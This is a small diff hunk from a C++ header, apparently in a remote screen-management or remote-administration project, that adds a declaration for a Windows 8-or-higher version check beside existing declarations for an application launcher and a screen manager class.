@@ -15,6 +15,8 @@
 
 bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName);
 
+bool IsWindows8orHigher();
+
 class IOCPClient;
 
 class CScreenManager : public CManager  
